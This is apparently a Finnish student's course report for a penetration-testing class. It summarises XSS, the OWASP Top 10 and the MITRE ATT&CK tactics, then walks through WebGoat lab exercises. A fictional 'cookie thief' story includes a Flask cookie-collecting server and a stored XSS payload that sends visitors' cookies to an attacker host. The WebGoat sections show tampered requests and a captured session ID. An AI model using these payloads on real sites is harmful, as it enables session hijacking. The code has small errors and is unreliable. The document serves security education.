[<-- Takaisin etusivulle](index.md)

# h3: Attaaack!
Kurssisivu ja tehtävät: [https://terokarvinen.com/2021/penetration-testing-course-2021-autumn/#h3-attaaack](https://terokarvinen.com/2021/penetration-testing-course-2021-autumn/#h3-attaaack)

## Sisällysluettelo 

* TOC
{:toc}

## x) Lue/katso/kuuntele ja tiivistä
*Tässä alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen ja tiivistelmä riittää). Tiivistä ranskalaisilla viivoilla.*

### € Percival & Samancioglu 2020: The Complete Ethical Hacking Course: Chapter 21: Cross Site Scripting
*[Chapter 21: Cross Site Scripting](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_1/) (7 videota, noin 25 min)*
 - XSS tarkoittaa Cross-Site Scriptingiä. 
 - XSS ei tarvitse erillistä ohjelmaa.
 - Syöttää injektion palvelimelle joka ajetaan käyttäjäpäässä, uhrin selaimessa. 
 - Syöttökentässä voidaan lähettää skripti URL:ssa. 
    - Tarkoittaa että syöttökentässä käytetään GET methodia. 
    - Tämä häkätty URL voidaan sitten lähettää kenelle tahansa joka linkkiä klikatessaan ajaa URL:ssa olevan skriptin. 
 - Voidaan myös tallettaa skripti sivulle POST methodilla syöttökentän kautta jos sivu tallettaa tietoja. 
    - Kuka tahansa sivulle tulija automaattisesti ajaa skriptin.
    - Elementin maxlength voi muokkaa dev toolseilla ja syöttää pidempiä skriptejä kuin lähdekoodi sallisi. 
 - Yhdistettynä muihin työkaluihin kuten BeEF ([https://beefproject.com/](https://beefproject.com/)) voi kerätä haavottuneita koneita talteen jatkohyökkäystä varten. 
 - Suojautumiseksi selaimen asetuksissa voi kytkeä yksittäisten sivujen JavaScriptin pois päältä. (Joku vertasi joskus verkkosivuja autoon ja JavaScriptiä rattiin, eli mistään universaalista hyvästä ratkaisusta ei ole kyse.) 

### OWASP 10 2017 [PDF](https://raw.githubusercontent.com/OWASP/Top10/master/2017/OWASP%20Top%2010-2017%20(en).pdf)
*A2 Broken Authentication, A3 Sensitive Data Exposure, A7 Cross Site Scripting.
Poimi kustakin kolmesta hyökkäyksestä, miten ne käytännössä tehdään*

#### A2 Broken Authentication
Hyökkääjillä hallussa miljoonia käyttäjätunnuksia ja salasanayhdistelmiä ([https://owasp.org/www-community/attacks/Credential_stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)), default ylläpitotililistoja, automatisoituja brute force- ja sanakirjahyökkäyksiä. Istunnonhallintahyökkäykset ja vanhentumattomat istuntotokenit hyökkääjillä hyvin tiedossa. 

Hyökkäystapoja: 
  - Credential stuffing
    - Listoja tunnettuja salasanoja yhdessä käyttäjätunnuksen kanssa syötetään palveluun
  - Salasanojen käyttö ainoana tunnistustapana. Salasanojen kierrättäminen ongelma. 
  - Istunnon aikakatkaisu ei ole säädetty oikein. Uhri käyttää julkista konetta, kirjautuu palveluun ja sulkee selaimen uloskirjautuisen sijasta. Hyökkääjä käyttää myöhemmin samaa konetta ja istuntotokenia. 

#### A3 Sensitive Data Exposure
Hyökkääjät varastavat avaimia tai selkotekstistä dataa, tekevät man-in-the-middle hyökkäyksiä. Aiemmin saadut salasanatietokannat voidaan brute forcettaa näytönohjaimilla. 

Hyökkäystapoja:
 - Applikaatio kryptaa luottokortin numerot kannassa, mutta automaattisesti purkaa kryptauksen niitä haettaessa. SQL-injektio hakee selkotekstiset luottokorttitiedot.
 - Sivu ei varmista TLS:n käyttöä tai käyttää heikkoa kryptausta. Hyökkääjä tarkkailee verkkoliikennettä suojaamattomassa WLAN verkossa ja heikentää yhteydet https:stä http:hen. Hyökkääjä sieppaa verkkopyynnön ja käyttäjän istuntokeksin. Hyökkääjä käyttää keksiä varmennetun istunnon kaappaamiseen ja pääsee käyttäjän dataan. 
 - Salasanatietokanta käyttää yksinkertaisia tai suolaamattomia ([https://en.wikipedia.org/wiki/Salt_(cryptography)](https://en.wikipedia.org/wiki/Salt_(cryptography))) tiivisteitä. Latausvirhe mahdollistaa hyökkääjän ladata kannan. Suolaamattomat tiivisteet voidaan murtaa etukäteen lasketuilla tiivisteillä, [rainbow tableilla](https://en.wikipedia.org/wiki/Rainbow_table). Yksinkertaisilla tai nopeilla tiivistefunktioilla muodostetut tiivisteet voidaan murtaa näytönohjaimilla vaikka ne olisi suolattu. 

#### A7 Cross Site Scripting
Sisältää kolme tapaa jotka kohdistuvat yleensä uhrin selaimeen: 
 - Reflected XSS
  - Validoimaton vihamielinen käyttäjäsyöteskripti syötetään osaksi sivun HTML:ää. 
  - Liittyy, lisälukemista: watering hole attack: [https://en.wikipedia.org/wiki/Watering_hole_attack](https://en.wikipedia.org/wiki/Watering_hole_attack)
 - Stored XSS
  - Validoimaton vihamielinen käyttäjäsyöteskripti tallentuu ohjelmistoon tai API:in.
 - DOM XSS
  - Dynaamisesti lisätty vihamielinen skripti. 

Hyökkäys tehdään yleensä validoimattoman ja sanitarisoimattoman käyttäjäsyötteen kautta. Hyökkääjä syöttää syöttökentän kautta hyökkäyksen kohdeohjelmistoon skriptin, jonka uhri suorittaa selaimessaan ollessaan yhteydessä häkättyyn kohdeohjelmistoon. 

### MITRE 2021: [ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/) - Tactic, Technique, Procedure
*Selitä tiivistelmässä käsitteet tactic, technique, procedure. Selitä kukin taktiikka (tactic) ja anna kustakin taktiikasta esimerkkitekniikka (technique tai subtechnique)*

Kuten lounastauolla tuli jo tutuksi, taktiikat ovat yläkäsite, se mitä hyökääjä tavoittelee, tekniikat kuinka hyökkääjä sen tekee ja proseduurit todellisia tapahtumia missä tekniikkaa on käytetty. 

  - Taktiikat vastaavat kysymykseen "miksi". Se on hyökkääjän tavoittelema taktinen tavoite kuten autentikoitu sisäänpääsy järjestelmään. 
  - Tekniikat vastaavat kysymykseen "kuinka". Se kuvailee kuinka hyökkääjä saavuttaa taktisen tavoitteensa. 
  - Proseduurit ovat spesifejä toteutuksia tietystä tekniikasta tai alatekniikasta. Proseduurit on kategorisoitu niiden todellisten käyttötilanteiden pohjalta proseduuriesimerkit -kohtaan tekniikoissa. 

#### Taktiikka: Tiedustelu (Reconnaissance)
Tiedusteluvaiheessa hyökkääjä kerää tietoa jatko-operaatioiden suunnittelemiseksi. 

#### Taktiikka: Resurssien kokoaminen (Resource Development)
Resurssien kokoamisen aikana hyökkääjä kerää, kehittää, ostaa, varastaa, tms. muin keinoin haalii resursseja operaatioidensa tueksi. 

#### Taktiikka: Sisäänpääsy (Initial Access)
Hyökkääjä pyrkii sisään kohdeverkkoon. 

#### Taktiikka: Suorittaminen (Execution)
Hyökkääjä pyrkii ajamaan vihamielistä koodia kohteen lokaaleissa tai etäjärjestelmissä. 

#### Taktiikka: Pysyminen (Persistence)
Hyökkääjä pyrkii pitämään jalansijansa kohdejärjestelmissä salasanavaihdoista, uudelleenkäynnistyksistä jne. huolimatta.

#### Taktiikka: Käyttöoikeuksien kasvattaminen (Privilege Escalation)
Hyökkääjä pyrkii kasvattamaan käyttöoikeuksiaan suuremman keinovalikoiman mahdollistamiseksi. 

#### Taktiikka: Piiloutuminen (Defense Evasion)
Hyökkääjä pyrkii piileskelemään kohdeverkossa tai -järjestelmissä. 

#### Taktiikka: Tunnistetietojen käyttö (Credential Access)
Hyökkääjä pyrkii varastamaan salasanoja ja käyttäjänimiä. 

#### Taktiikka: Kartoittaminen (Discovery)
Hyökkääjä pyrkii hahmottamaan kohdeympäristöä suunnitellakseen jatko-operaatioita. 

#### Taktiikka: Ympäristössä liikkuminen (Lateral Movement)
Hyökkääjä liikkuu ympäristössä saavuttaakseen tavoitteensa tai etua jatko-operaatioihin. 

#### Taktiikka: Datan kerääminen (Collection)
Hyökkääjä kerää dataa tavoitteensa saavuttamiseksi. 

#### Taktiikka: Hallinta (Command and Control)
Hyökkääjä kommunikoi vaarantuneiden järjestelmien kanssa saavuttaakseen niiden hallinnan. 

#### Taktiikka: Datan varastaminen (Exfiltration)
Hyökkääjä pyrkii kotiuttamaan keräämänsä datan kohdejärjestelmästä. 

#### Taktiikka: Vaikuttaminen (Impact)
Hyökkääjä pyrkii manipuloimaan, häiritsemään tai tuhoamaan kohdejärjestelmiä tai kohdedataa.

## z) Cross Site Story
*Kirjoita kuvitteellinen esimerkki XSS-hyökkäyksestä. Tee mahdollisimman yksinkertainen esimerkki. Voit vaikkapa ottaa haltuun weppisivun ylläpitäjän oikeudet viemällä keksin. Tässä alakohdassa ei tarvitse tehdä mitään tietokoneella, pelkkä tarina riittää. Tarkoituksena on ymmärtää XSS-hyökkäyksen kokonaisuus ennen sormiharjoituksia. Voi halutessasi myös piirtää itse kaavion / sarjakuvan.*

### Tarinan tausta
Traaginen postmoderni tarina Cross Site Story sijoittuu kaikille tuttuun miljööseen, Internettiin. Tarina on monelle tuttu, sillä se on [OWASP TOP 10:ssä](https://raw.githubusercontent.com/OWASP/Top10/master/2017/OWASP%20Top%2010-2017%20(en).pdf) 2017 sijalla seitsemän ja vuonna 2019 tehdyn [tutkimuksen](https://digitalcommons.odu.edu/cgi/viewcontent.cgi?article=1459&context=vjs) mukaan yli 60% verkkosivuista oli XSS-hyökkäykselle alttiita.

Tarinassa on käytetty lähtökohtana tehtävänannon esimerkkiä verkkosivun ylläpitäjän keksin varastamisesta ja [Laur Telliskiven blogipostausta aiheesta](https://medium.com/@laur.telliskivi/pentesting-basics-cookie-grabber-xss-8b672e4738b2). Keksivaras kertoo palvelimelle tallennetusta, stored XSS-hyökkäyksen tyypistä (muita olivat DOM eli verkkosivulle dynaamisesti lisätty vihamielinen skripti ja reflected eli käyttäjän selaimessa tapahtuva XSS). Yksinkertaisempi heijasteinen (reflected) XSS-hyökkäys esimerkki voidaan kuvata näin [aiemman tehtävän perusteella](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_5/): 

  - Verkkosivu kysyy käyttäjän nimeä syöttökentässä. 
  - Verkkosivu lähettää käyttäjälle tervehdyksen nimen perusteella url:n parametrina http://sivu-url?name=nihti, selaimessa näkyy "Hello nihti". 
  - Hyökkääjä syöttää XSS-hyökkäykselle alttiiseen verkkosivun syöttökenttään js-skriptin: 
  
```html
<script>alert("I hack you")</script>
```

  - Hyökkääjä kopioi syntyneen url:n: `http://sivu-url?name=<script>alert("I+hack+you")<%2Fscript>#` ja lähettää sen pahaa-aavistamattomalle uhrille. Jos sivusto http://sivu-url on julkisessa verkossa kuka tahansa linkkiä seuraava altistuu skriptille. 
  - Hyökkääjä voisi vielä naamioida linkin tekstin houkuttelevammaksi esimerkiksi sähköpostissa, tähän tapaan:
 
[Klikkaamaan houkutteleva linkkiteksti](ihackyou.md)

Ja tämä näytelmä pyörisi kaikissa linkkiä klikanneissa selaimissa. 

### Esityksen entiteetit
Näytelmässä ei ole kivoja rooleja jaossa, vaan tämä on varoittava esimerkkitarina. 

  - **Keksivaras/hyökkääjä** 
  - **Keksivarasto/hyökkääjän palvelin**
  - **Käyttäjä/uhri/selain** 
  - **XSS-hyökkäykselle altis verkkosivu/palvelin** 

### Keksivaras
*Tee selväksi ja erottele
  *- Mitä hyökkääjä tekee
  *- Mitä kohdehenkilö tekee
  *- Mitä sivua / palvelinta kohdehenkilö surffailee
  *- Missä JavaScriptit ajetaan
  *- Miten keksi päätyy hyökkääjälle
  *- Miten hyökkääjä hyödyntää keksiä?
  *- Mitä hyökkääjä pääsee tekemään (mikä ei onnistuisi ilman hyökkäystä)?*
  
Istunto- ja autentikointikeksit sisältävät tietoa käyttäjän sivukäynnistä (kuinka, milloin?) ja käyttäjästä itsestään (käyttäjänimi, salasana). Keksivarkaan ensimmäinen tehtävä on pystyttää oma varastettujen keksien varastona toimiva verkkopalvelin http://keksivarasto.com. Keksivaras käyttää Pythonin verkkopalvelin framework [Flaskia](https://flask.palletsprojects.com/en/2.0.x/).

  - Hyökkääjä löytää verkosta XSS-hyökkäykselle haavoittuvan verkkosivun osoitteessa http://haavoittuvasivu.fi/
  - Hyökkääjä perustaa keksivarastona toimivan palvelimen. 
  - Hyökkääjä kirjoittaa oman funktion keksien sieppaamiseksi:

```python
# ... enemmän koodia

def keksi():

    # Siepataan keksi ja kirjataan se keksit.txt tiedostoon
    
    keksi = request.args.get('c')
    f = open("keksit.txt","a")
    f.write(keksi + ' ' + str(datetime.now()) + '\n')
    f.close
    
    # Ohjaa uhri takaisin haavoittuvalle sivulle    
    
    return redirect("http://haavoittuvasivu.fi/")
    
# ... lisää koodia
  app.run(host = '0.0.0.0', port=5000) # 0.0.0.0 kuuntelee kaikkia julkisia IP:tä
```

  - Hyökkääjä injektoi JavaScript-koodin XSS-hyökkäykselle alttiille haavoittuvasivu.fi:lle sivuston kommenttikentän syöttökentän kautta:

```javascript
<script type=“text/javascript”>document.location=“http://keksivarasto.com:5000/?c=“+document.keksi;</script>
```

  - Skripti tallentuu XSS-hyökkäykselle haavoittuvan sivun haavoittuvasivu.fi kommenttiosion lähdekoodiin. 
  - Injektoitu skripti ohjaa haavoittuvasivu.fi:n kommenttiosiolle tulevan käyttäjän keksivarasto.com sivulle ja sieppaa käyttäjän keksin document.keksi funktiolla.
  - Käyttäjä kirjautuu haavoittuvasivu.fi:lle ja surffaa kommenttiosioon jolloin keksivaraston keksit.txt tiedostoon tallentuu uusi keksi. 
  - Keksivaras kirjautuu varastettua keksiä keksit.txt tiedostosta käyttäen haavoittuvasivu.fi:lle. 
  - Koska käyttäjä oli sivuston pääkäyttäjä, nyt keksivarkaalla on sivuston ylläpitäjän kaikki oikeudet. Hänellä on kaikki oikeudet lisätä, poistaa tai muokata sivustoa mielensä mukaan.

## Tee ja raportoi: a) Vuohen uudet seikkailut
*Ratkaise WebGoatista tehtävät*

### Alkutoimet
Joudun aloittamaan tehtävän uudella [WebGoatin](https://owasp.org/www-project-webgoat/) asennuksella koska lapsi meni pesuveden mukana kun poistin turhia koneita VB:stä viime kerran jälkeen. Aloitan importtaamalla Kali Linux VB:hen ja seuraamalla jälleen opettajan ohjeita: [https://terokarvinen.com/2020/install-webgoat-web-pentest-practice-target/](https://terokarvinen.com/2020/install-webgoat-web-pentest-practice-target/). 

Vaihdetaan ensin kuitenkin näppäimistö Keyboard -> Layout -> Edit -> eng -> fi ja salasana:
`passwd`
`sudo passwd` 

Sitten ajetaan update ja vaihdetaan rootiksi:
`sudo apt-get update`
`sudo -i` 

Asennetaan Java ja [UFW](https://www.linux.fi/wiki/UFW) palomuuri 
`apt-get -y install openjdk-11-jre ufw`

Laitetaan palomuuri päälle ja kielletään kaikki sisääntuleva liikenne
`ufw enable`
`ufw default deny incoming` 

Asennetaan WebGoat jälleen Kalina
`exit`
Ladataan WG
`wget https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M26/webgoat-server-8.0.0.M26.jar`
Asennetaan WG
`java -jar webgoat-server-8.0.0.M26.jar` 

Vika komento myös käynnistää WG:n, mennään selaimessa http://localhost:8080/WebGoat/ ja rekisteröidään uusi vuohi. 

#### Proxy - ZAP

Tehtävässä tarvitaan todennäköisesti [välityspalvelinta eli proxyä](https://fi.wikipedia.org/wiki/V%C3%A4lityspalvelin). Ensimmäisellä kerralla asensimme sen onnistuneesti WG:n omia ohjeita seuraamalla. Katsotaan millaista muuta ohjetta olisi tarjolla, sillä porttiasetukset jäivät viime kerralla hieman hämäriksi. Eli toisin kuin ekalla asennuksella kuvittelin, proxyn tulee nimenomaan olla omassa portissaan eikä pyöriä samassa portissa muiden ohjelmistojen kanssa - kuinka se olisi edes mahdollista? n00bin ajatuspieru ja l33tin facepalm tähän. 

Aloitetaan orientoivalla videoilla: [https://www.youtube.com/watch?v=ICPqz1Al9fk](https://www.youtube.com/watch?v=ICPqz1Al9fk) ja [https://www.youtube.com/watch?v=TyhaA3DJ5oM](https://www.youtube.com/watch?v=TyhaA3DJ5oM)

**Firefox**in (Kalin oletusselain) proxy säädetään Preferences --> Proxy --> Settings --> Manual proxy. HTTP Proxy: localhost (edit: muutettu ip-muotoon: 127.0.0.1), Port: 8090. Raksitaan myös https/ftp yhteyksille WG:n ohjeiden mukaan. Lisäksi Firefoxin uudet versiot ( >=v.67 ) vaatii asetuksen `network.proxy.allow_hijacking_localhost = true`, sinne pääsee selaimessa `about:config` sivulta. 

Koska proxyn manuaalinen päälle pistäminen ja poistaminen vaikutti työläältä viime kerralla asennetaan [FoxyProxy](https://addons.mozilla.org/fi/firefox/addon/foxyproxy-standard/) selainlaajennus. Asennusta varten otin proxyn pois päältä. Myös **FoxyProxy** vaatii proxy-asetusten säätämisen: Add --> Proxy Type: "HTTP", Proxy IP address or DNS name: "127.0.0.1", Port: "8090" ja Save. 

FoxyProxyn käyttö vaatii Firefox preferences --> Proxy --> Settings --> Manual proxyn vaihtamisen --> No proxy. Nyt FF asetusten sijasta selainlaajennus huolehtii proxyn päälle ja pois. 

**ZAP**:ssa Tools --> Options --> Local Proxies. Localhost 8090. 

Suodatetaan WebGoatin taustaliikenne pois ohjeiden mukaan: URL Inc Regex: `http://localhost:8080/WebGoat/.*`
Eli näytä ZAP:ssa kaikki localhostissa portissa 8080 /WebGoat/ polussa tapahtuva liikenne
ja suodata pois URL Exc Regex: `.*/WebGoat/service/.*mvc` eli kaikki WebGoat/service liikenne missä tiedostopääte mvc. 

Suodatus käyttää [regexiä](https://fi.wikipedia.org/wiki/S%C3%A4%C3%A4nn%C3%B6llinen_lauseke) eli regular expressionsia joka on oma taiteenlajinsa jota ilman ei voi paljoa hakkerointia harrastaa. Aihe on entuudesta tuttu ja sitä on tullut tavattua jo vähän muttei tarpeeksi. 

Viimein välityspalvelimen asetukset ovat valmiit! Sitten on opeteltava käyttämään OWASP ZAP:ia. WebGoat antaa vihjeitä kuinka tehtävä tulee ratkaista, mutta että ZAP:ssa saa valittua oikeat näkymät sen tekemiseksi?

### A2 Broken authentication:
#### Authentication bypasses: 2 2FA Password Reset
Katsotaan ensin mitä ZAP tallentaa kun tehtävän lomakkeessa lähettää jotain tietoa. "Sites" osioon tulee auth-bypass -kansio ja sinne POST-methodina lähetetty verify-account() funktio. Sitä klikkaamalla avautuu POST-requestin header ja body. Bodyssa on meitä kiinnostava osuus: `secQuestion0=ope&secQuestion1=jns&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746`. Eli tehtävänannon mukaisesti poistetaan secQuestion 0 ja 1. 

**1. ongelma.** En ollut painanut ZAP:n vihreää pylpyrää ja nauhoitusta päälle, joten en voinut muokata requestin bodya. Painetaan pylpyrä päälle ja lähetetään verkkosivulta sama vastaus kyselyyn. Sitten takaisin ZAP:ssa "Submit and step next request or next response" nuolinäppäintä, joka on mallia: |> 
Pari kertaa nuolta painamalla päästään POST requestiin ja sen bodyyn `secQuestion0=ope&secQuestion1=jns&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746`. Poistetaan turvakysymykset vastauksineen kuten ohjeistettu ja jätetään `jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746`. Painetaan nuolta seuraavaan vaiheeseen. Tulee HTTP OK jossa body lessonCompleted false ja WG näyttää myös ettei mennyt läpi. Klikkaillaan kuitenkin pari kertaa vielä eteenpäin ja sitten painetaan toista nuolta > joka lopettaa ilmeisesti nauhoituksen koska pylpyrä muuttuu jälleen vihreäksi. Nauhoituksen ollessa päällä se on punainen. 

Hmm. Näen nyt kuitenkin uuden POST-requestin, sen mitä juuri muokkasin. Pistetään jälleen nauhoitus päälle pylpyrästä ja klikataan pari kertaa steppiä eteenpäin |> nuolesta. Ei sen suurempaa onnea. Eli mielestäni minun pitäisi lähettää tämä requesti sivulle. Ehkä pitää valita modattu request sivuvalikosta ja painaa request? Kokeilin pari kertaa request-painiketta. Painetaan sitten nauhoitus päälle ja toistetaan sama modatun POST-requestin ollessa valittuna sivuvalikossa. Nyt steppi eteenpäin painamalla näkyy että "complete": true. WG:n sivu pysyy vielä samana mutta en ole refressannut sitä. Painetaan pari kertaa steppiä eteenpäin ja nähdään että "solved": false. Ja sama näkyy myös jos klikataan request välilehdeltä response välilehdelle. 

Jostakin syystä WG on muuttunat urlissa http:n https:ksi ja se on varmasti liian edistynyttä tähän vaiheeseen. Lisäksi WG ei päivitä sivua enää, se vaikuttaa jäätyneeltä. Poistetaan ZAP:sta Sites-kansiot ja käynnistetään WG uudestaan, yritetään tehtävää alusta. 

**2. yritys.** Varmistetaan että WG Katsotaan tässä vaiheessa joku ohje. Ymmärrän siis perusidean, mutta en ymmärrä kuinka ZAP:ia käytetään, kuinka saan lähetettyä oman muokatun POST-requestini. Käynnistetään WG terminaalissa `java -jar webgoat-server-8.0.0.M26.jar` ja ZAP on päällä. WG ei tunnu aukeavan. Pistetään ZAP:sta nauhoitus pois päältä ja kokeillaan urlia /WebGoat/ /WebGoat/login sijasta. Nyt taas tuntuu toimivan. Jostain syystä WG pakottaa https:n päälle. 

Katsotaan esimerkin ratkaisu niin teknisesti kelvottomalta YouTube-videolta että en sitä kenenkään riesaksi halua edes linkittää. Eli ainakin secquestioneja muokkaamalla tehtävän saa läpi `secQuestion00=ensin+perusteet&secQuestion01=sitten+soveltaminen%2C+plz&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746`. Sitten muokkauksen jälkeen painettiin > nuolta, mutta mielestäni |> nuolen renkuttaminen ajaa saman asian, se on vaan hitaampaa. Kokeillaan vielä toimiiko kysymysten ja verifyMethodin poistaminen kokonaan. Ei toimi, responsessa lukee:
```json
  "status" : 400,
  "error" : "Bad Request",
  "message" : "Required String parameter 'verifyMethod' is not present",
```

No olipas nyt vähän turhan kikkaileva aloitus ZAP:iin tutustumiseen, kun koko ohjelmiston käyttäminen on vierasta. Mutta tosiaan turvakysymyksiä ei voi kokonaan poistaa **toisin kuin tehtävä ohjeistaa**, vaan niitä on vain modifioitava. Huoh. Tämä olisi pitänyt oivaltaa responsesta selvästi, ja aiemmista esimerkeistä. 

### A3 Sensitive data exposure:  Insecure Login: 2 Let's try

Tässä tehtävässä tarvitaan [packet snifferiä](https://en.wikipedia.org/wiki/Packet_analyzer). Tiedän että WireShark on sellainen (jota en ole koskaan opetellut käyttämään), mutta en tiedä ajaako ZAP saman asian. Toisaalta huomasin jo ensimmäisen viikon tehtävissä että ZAP kaappasi käyttäjätunnuksen ja salasanani kirjautuessani WG:hen. Haen asialle harharetkien välttämiseksi verkosta, kyllä ZAP:n pitäisi riittää. Laitetaan nauhoitus päälle ja syötetään joku käyttäjätunnus ja salasana syöttökenttään. Klikkaillaan yksi steppi kerrallaan eteenpäin uutta GET:InsecureLogin.lesson.lessonia Sites-sivuvalikossa, joka ilmestyy sinne kun syötän sivulle tunnistetiedot ja klikkaan sumbit ja login. Parin klikin päässä on Break jonka body on `{"username":"CaptainJack","password":"BlackPearl"}`. Nämä eivät ole minun syöttämäni arvot, joten näiden täytyy olla oikeat arvot. Kokeillaan niitä tehtävään. Painetaan ensin play > että sivun käyttö jälleen mahdollistuu. Syötetään kaapatut arvot syöttökenttiin ja voilà, läpi menee. 

Eli kaappasimme ZAP:lla POST requestin. Miksi väärät tunnistetiedot syöttämällä sivu tarjoaa todellisia tunnistetietoja jää hämäräksi. En ymmärrä tehtävän logiikkaa. Tiedostan myöskin että WireSharkin harjoittelun viivästyttäminen tulee puremaan minua takapuoleen vielä jossakin vaiheessa kurssia. 

### A7 Cross Site Scripting (XSS): 2 What is XSS?
Avataan ohjeen mukaisesti toinen välilehti WG:hen. Kopioidaan `javascript:alert(document.cookie);` ja syötetään urliin. Kokeillaan "xss test" document.cookien sijasta. Otetaan proxy pois päältä. Ei vastauksia. Jahas WG oli ollut sen aikaa pois käytöstä että se oli jäätynyt. Silti sama radiohiljaisuus.

Kokeillaan consolessa [tämän stackexchange.comin ohjeen pohjalta](https://security.stackexchange.com/questions/82652/do-webgoat-style-xss-attacks-still-work): `alert(document.cookie);` ja saadaan vastaus jossa mm. istunnon id: `JSESSIONID=I3TwzmS474ttSPeY25sJH_EnPRxi3IJr6GNXANV0;` 
Kyseisellä cookiella on on header HttpOnly: false kuten ilmeisesti edellytys onkin. Eli cookie JSESSIONID:n tarkastaminen ja "yes" riitti vastaukseksi, vaikka hämäräksihän ongelma vielä jäikin. Eli WebGoat tunnistaa minut samaksi henkilöksi molemmissa välilehdissä cookien ansiosta. Jos joku kaappaisi keksin ja käyttäisi sitä, voisi operoida minun tunnistetiedoilla WG:ssä. 

Eli js-skriptit toimivat consolessa ajaessa, mutta suoraan urlissa Kalin oletusselaimella eivät. 

En tiedä onko kyse selaimien uusista asetuksista, toivottavasti tehtävien läpikäynti tuo tähän vastauksenm jatkogooglettelu ei tuo vastausta nopeasti ja tehtäviä vielä riittää...: [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection). 

### A7 Cross Site Scripting (XSS): 7 Try It! Reflected XSS
Eli tehtävässä on ostoskori ja syöttökentät luottokorttinumero ja access code. Developer toolsien Storage välilehdeltä löytyy cookie access_token. Sen voisi printata Console välilehden `alert(document.cookie)` komennolla. Sen arvo on kuitenkin tyhjä. Hmm. Sitten kokeillaan `<script>alert("injektoitavissa")</script>` molempiin syöttökenttiin. Huomataan ilmoitus: 

>>> "Seems like you tried to compromise our shop with an reflected XSS attack.<br/> We do our... "best"... to prevent such attacks. Try again!"

Eli nyt ollaan lähellä. Ymmärretään poistaa alemmassa syöttökentässä oleva scripti ja laitetaan siihen joku oikea arvo 111, ja sitten ylemmän syöttökentän scripti menee läpi. Eli kuten injektioissa XSS hyökkäyksissä käyttäjäsyötteet mahdollistivat hyökkäyksen. 

XSS harjoituksia jää WG:ssä vielä kolme syssymmälle, mutta tämä tehtävä jonka onnistuin kerrankin suorittamaan ilman ulkopuolisia ohjeita oli tällä haavaa tässä. 

### A8:2013 Request Forgeries: Cross-Site Request Forgeries
Hämmentyneen apulaisen hyökkäys. CSRF on "Confused Deputy" hyökkäys ja tunnetaan nimillä one-click attack ja session riding, ja vielä lisäksi joskus äännetään "sea-surf". Sen ominaispiirteet ovat:
  - sivut tarvitsevat käyttäjän identiteettiä
  - tätä tarvetta käytetään hyökkäyksessä hyväksi
  - huijaa käyttäjän selaimen lähettämään requesteja kohdesivulle
  - requesteja joilla on sivuvaikutuksia

### A8:2013 Request Forgeries: 3 "Basic Get CSRF Exercise"
Luetaan tehtävänanto ja klikataan suoraan vihjettä, eli lomakkeessa on piilotettu syöttökenttä. Tällaisia piilotettuja syöttökenttiä voidaan käyttää verkkosivuilla esimerkiksi honeypotteina spämmiboteille. Selataan DOMia ja löydetään `display: none`:lla piilotettuja elementtejä, pistetään `display: block`. Ainaskin paljon tekstiä jos ei syöttökenttää. Tekstissä on ohjeita hyökkäysten torjumiseksi. Laitetaan toisellekin blokille sama. Ylempää löytyy sitten lisää ohjeita: avaa uusi täbi WG:hen ja tee uusi käyttäjä samalla tunnuksella mutta laita sen etuliitteeksi csrf- ja loggaa sisään. 

Luodaan uusi käyttäjä csrf-verkkovuohi ja kirjaudutaan sisään. Koska olen nopeudeltani aivan boomer tietokoneiden kanssa on aiempi käyttäjä jo loggautunut ulos kun saan uuden käyttäjän valmiiksi. Aloitan tehtävän alusta ja huomaan nyt että piilotettua matskua DOM:ssa oli enemmänkin. Nyt saan jonkun kissakuvan ja lisää tekstiä. Jahas nyt pitää arvioida applikaatiota. Mitähän he****** tehtävässä on tarkoitus tehdä. Täytän lomakkeen vaan jollakin arvoilla testatakseni sitä, saan Whitelabel errorin. 

Ermmm...

Palataan selaimessa taaksepäin, katsellaan lisää DOM:ia, yritetään löytää se alkuperäinen syöttökenttä. Katsotaan kuitenkin ensin onko nyt löydetyt piilotetut elementit myöhempien vaiheiden tehtäviä. On. Kissa tulee vasta seuraavassa vaiheessa, post a review... Entäpäs se aiemmin löydetty ohje uuden käyttäjän tekemisestä? Selataan tehtävä loppuun. Sekin on vasta myöhäisempi vaihe tehtäväsarjassa. Jahas nonin aloitetaan alusta.

Jaaa, piilotettu kenttä olikin Submit Query painikkeen vieressä. Sen type on "hidden", name csrf ja arvo false. No muutetaan true syöttökentässä. Ei mene läpi. Muutetaan true:ksi domissa? Ei hyödytä. Katsotaan tässä vaiheessa esimerkkiratkaisu, joka perustuu url:n parametrien muokkaamiseen. Mutta meidän queryn urlissa parametreja ei ole: `http://localhost:8080/WebGoat/csrf/basic-get-flag` ja JSON data näyttää tältä: 

```json
{
  "flag" : null,
  "success" : false,
  "message" : "Appears the request came from the original host"
}
```

Hmm. Kuinka voidaan muuttaa lähettäjän tietoja... katsotaan Headerit:

```text
Response Headers
  Connection: keep-alive
  Content-Type: application/json
  Date: Sat, 13 Nov 2021 16:33:11 GMT
  Transfer-Encoding: chunked
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  X-XSS-Protection: 1; mode=block

Request Headers
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US,en;q=0.5
  Connection: keep-alive
  Content-Length: 29
  Content-Type: application/x-www-form-urlencoded
  Host: localhost:8080
  Origin: http://localhost:8080
  Referer: http://localhost:8080/WebGoat/start.mvc
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
```

>>> Trigger the form below from an external source while logged in. The response will include a 'flag' (a numeric value).

Hmmmhh.. eli ZAP:lla? Postmanillahan voisin tehdä POST requestin, ehkä ZAP:lla onnistuu sama? Otetaan lomakkeen tiedot talteen.

```html
<form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" successcallback="" action="/WebGoat/csrf/basic-get-flag" enctype="application/json;charset=UTF-8">
    <input name="csrf" type="text" value="true">
